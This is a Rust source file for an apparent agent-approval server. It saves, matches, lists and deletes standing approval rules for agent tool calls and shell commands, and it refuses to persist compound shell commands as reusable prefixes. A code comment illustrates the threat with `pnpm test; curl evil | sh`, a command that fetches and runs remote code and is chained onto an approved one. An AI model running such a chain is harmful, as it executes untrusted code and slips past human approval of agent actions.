//! Standing approval rules: matching, persistence and administration.

use super::{parse_scope, ApprovalRow};
use crate::error::ServerError;
use sqlx::{FromRow, SqlitePool};
use threadbase_shared::{ApiError, ApprovalScope, UserBrief};

pub(super) async fn save_rule(
    pool: &SqlitePool,
    row: &ApprovalRow,
    scope: &str,
    created_by: &str,
    now: i64,
) -> Result<(), ServerError> {
    // A command containing shell syntax is approved for this request only.
    // Persisting it as a standing prefix would let a different, compound
    // command reuse the approval (for example `pnpm test; curl evil | sh`).
    // Non-command tools (row.command == None) still get tool-wide rules.
    if let Some(command) = row.command.as_deref() {
        if !threadbase_core::command_is_reusable(command) {
            return Ok(());
        }
    }
    let project_id: String = sqlx::query_scalar("SELECT project_id FROM threads WHERE id = ?")
        .bind(&row.thread_id)
        .fetch_one(pool)
        .await?;
    sqlx::query(
        "INSERT INTO approval_rules(id, project_id, thread_id, agent, tool, command_prefix,
            scope, created_by, created_at)
         VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)",
    )
    .bind(ulid::Ulid::new().to_string())
    .bind(project_id)
    .bind(&row.thread_id)
    .bind(&row.agent)
    .bind(&row.kind)
    .bind(row.command.as_deref())
    .bind(scope)
    .bind(created_by)
    .bind(now)
    .execute(pool)
    .await?;
    Ok(())
}

#[derive(Debug, Clone)]
pub struct MatchedRule {
    pub scope: ApprovalScope,
    pub created_by: String,
}

pub async fn match_rule(
    pool: &SqlitePool,
    thread_id: &str,
    agent: &str,
    tool: &str,
    command: Option<&str>,
    cwd: Option<&str>,
    is_subagent: bool,
) -> Result<Option<MatchedRule>, ServerError> {
    let (project_id, worktree): (String, Option<String>) =
        sqlx::query_as("SELECT project_id, worktree_path FROM threads WHERE id = ?")
            .bind(thread_id)
            .fetch_optional(pool)
            .await?
            .ok_or_else(|| ServerError(ApiError::not_found("thread not found")))?;
    let rows: Vec<(String, String, String, Option<String>)> = sqlx::query_as(
        "SELECT scope, created_by, agent, command_prefix FROM approval_rules
         WHERE project_id = ? AND agent = ? AND tool = ? AND (thread_id = ? OR thread_id IS NULL)
         ORDER BY created_at DESC",
    )
    .bind(project_id)
    .bind(agent)
    .bind(tool)
    .bind(thread_id)
    .fetch_all(pool)
    .await?;
    for (scope, created_by, rule_agent, prefix) in rows {
        if !threadbase_core::rule_matches(
            &rule_agent,
            tool,
            prefix.as_deref(),
            agent,
            tool,
            command,
        ) {
            continue;
        }
        if is_subagent {
            if let (Some(cwd), Some(root)) = (cwd, worktree.as_deref()) {
                if !threadbase_core::rule_inherits_to_child(root, cwd) {
                    continue;
                }
            }
        }
        let scope = match scope.as_str() {
            "thread" => ApprovalScope::Thread,
            _ => ApprovalScope::Session,
        };
        return Ok(Some(MatchedRule { scope, created_by }));
    }
    Ok(None)
}

pub async fn list_rules(
    pool: &SqlitePool,
) -> Result<Vec<threadbase_shared::ApprovalRuleDto>, ServerError> {
    let rows: Vec<RuleRow> = sqlx::query_as(
        "SELECT r.id, r.project_id, r.thread_id, r.agent, r.tool, r.command_prefix, r.scope,
                r.created_by, r.created_at, u.username, u.display_name, u.avatar_url
         FROM approval_rules r JOIN users u ON u.id = r.created_by
         ORDER BY r.created_at DESC",
    )
    .fetch_all(pool)
    .await?;
    Ok(rows
        .into_iter()
        .map(|row| threadbase_shared::ApprovalRuleDto {
            id: row.id,
            project_id: row.project_id.into(),
            thread_id: row.thread_id.map(Into::into),
            agent: row.agent,
            tool: row.tool,
            command_prefix: row.command_prefix,
            scope: parse_scope(&row.scope).unwrap_or(ApprovalScope::Once),
            created_by: UserBrief {
                id: row.created_by.clone().into(),
                username: row.username,
                display_name: row.display_name,
                avatar_url: row.avatar_url,
                color: threadbase_shared::user_color(&row.created_by).to_owned(),
            },
            created_at: row.created_at,
        })
        .collect())
}

pub async fn delete_rule(pool: &SqlitePool, rule_id: &str) -> Result<(), ServerError> {
    let result = sqlx::query("DELETE FROM approval_rules WHERE id = ?")
        .bind(rule_id)
        .execute(pool)
        .await?;
    if result.rows_affected() == 0 {
        return Err(ServerError(ApiError::not_found("approval rule not found")));
    }
    Ok(())
}

#[derive(Debug, FromRow)]
struct RuleRow {
    id: String,
    project_id: String,
    thread_id: Option<String>,
    agent: String,
    tool: String,
    command_prefix: Option<String>,
    scope: String,
    created_by: String,
    created_at: i64,
    username: String,
    display_name: String,
    avatar_url: Option<String>,
}
